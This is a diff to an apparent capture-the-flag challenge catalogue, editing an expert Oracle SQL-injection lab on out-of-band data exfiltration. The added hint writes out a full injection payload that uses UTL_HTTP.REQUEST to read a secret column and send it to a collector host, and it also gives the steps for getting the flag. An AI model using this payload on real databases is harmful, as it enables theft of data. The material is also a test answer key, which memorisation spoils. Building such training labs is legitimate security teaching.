@@ -380,8 +380,8 @@
         "title": "Out-of-Band Exfiltration on Oracle via UTL_HTTP",
         "difficulty": "expert",
         "description": "An enterprise-style reporting endpoint runs on Oracle 21c XE and gives absolutely no output, no error, and no timing side channel worth using (the backend has ~500ms jitter). But the DB user has EXECUTE on UTL_HTTP and can reach a controlled DNS/HTTP collector running inside the lab network on port 9000. Students learn to exfiltrate data through DNS labels and HTTP paths.",
-        "objective": "Exfiltrate secrets.oracle_secret (a 32-char hex value) to the built-in collector at oob.lab:9000, then POST the collected value back to /solve to receive the flag. The collector's captured requests are also visible at http://oob.lab:9000/log.",
-        "flag_hint": "/solve verifies the value matches secrets.oracle_secret and returns the flag from /flag.txt.",
+        "objective": "Chain the SQLi in /reports/by-region?region= into a scalar-subquery UTL_HTTP.REQUEST that reads secrets.oracle_secret and posts it out-of-band to the in-lab OOB collector (host oob port 9000). Read what the collector captured via GET /oob/received (app-side proxy — the DB is on a no-egress network), then POST /solve {\"secret\":\"<32 hex>\"} for the flag.",
+        "flag_hint": "Inject a scalar-subquery UTL_HTTP call inside the WHERE-clause concat: region=\"x\" || (SELECT UTL_HTTP.REQUEST(\"http://oob:9000/x=\"||oracle_secret) FROM secrets WHERE ROWNUM=1) || \"y\". Then GET /oob/received to read the exfil, POST /solve to receive FLAG{...}. Heavy tier — runs nightly, not on every PR.",
         "skills_taught": [
           "Oracle UTL_HTTP / UTL_INADDR exfil",
           "Encoding data into DNS labels",
@@ -389,12 +389,15 @@
           "Handling ACLs and DBMS_NETWORK_ACL_ADMIN in Oracle 21c"
         ],
         "tech_stack": [
-          "Java 21",
-          "Spring Boot 3.3 (JdbcTemplate with concat)",
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "python-oracledb 4.0 (thin mode)",
           "Oracle Database 21c XE",
-          "Custom Go 1.23 DNS/HTTP collector on port 9000"
+          "OOB collector sidecar"
         ],
-        "inspired_by": "The classic Chris Anley Oracle OOB paper and the modern-day Vozec/GossiTheDog Oracle OOB write-ups"
+        "inspired_by": "The classic Chris Anley Oracle OOB paper and the modern-day Vozec/GossiTheDog Oracle OOB write-ups",
+        "resource_tier": "heavy"
       },
       {
         "slug": "sqli-mssql-stacked-xp-cmdshell",
